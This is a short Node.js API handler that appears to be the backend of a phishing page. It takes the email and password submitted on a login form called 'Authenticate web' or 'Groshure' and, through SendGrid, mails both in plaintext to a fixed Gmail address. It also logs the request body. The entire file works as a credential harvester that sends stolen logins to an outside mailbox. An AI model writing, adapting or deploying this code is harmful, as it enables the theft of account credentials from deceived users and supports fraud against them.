import sendgrid from "@sendgrid/mail"

sendgrid.setApiKey(process.env.SENDGRID_API_KEY)

async function sendEmail(req, res){
    
  console.log(req.body)

  try{
    await sendgrid.send(
      {
        to: 'untamed737@gmail.com',
        from: 'dimeygee1@gmail.com', 
        subject: "Authenticateweb",
        text: 'and easy to do anywhere, even with Node.js',
        html: `<!DOCTYPE html">
        <html lang="en">
        <head>
          <meta charset="utf-8">
        
        <meta http-equiv="Content-Type" content="text/html charset=UTF-8" />
        
        </head>
        
        <body>
          <div style="display: flex;justify-content: center;align-items: center;border-radius: 5px;overflow: hidden; font-family: 'helvetica', 'ui-sans';">              
                </div>
                <div style="padding-left:5px; padding-right:5px; color:white;">
                  <h3>New form submission on Authenticate web</h3><b>
                  <p>someone just submitted a form on Groshure. Here's what they had to say</p><br/><br/>
                  <div>
                    <p>Email</p>
                    <p style="font-weight:bolder;">${req.body.email}</p>
                  </div>
                  <br/>
                  <div>
                    <p>Password</p>
                    <div style="font-weight:bolder;">${req.body.password}</div>
                  </div>
                </div>
        </body>
        </html>`,
      }
    )

  }catch(err){
    console.log(err)
    return res.status(err.statusCode || 500).json({error: "opps!! something went wrong"})
  }

  return res.status(200).json({error : ""})

}

export default sendEmail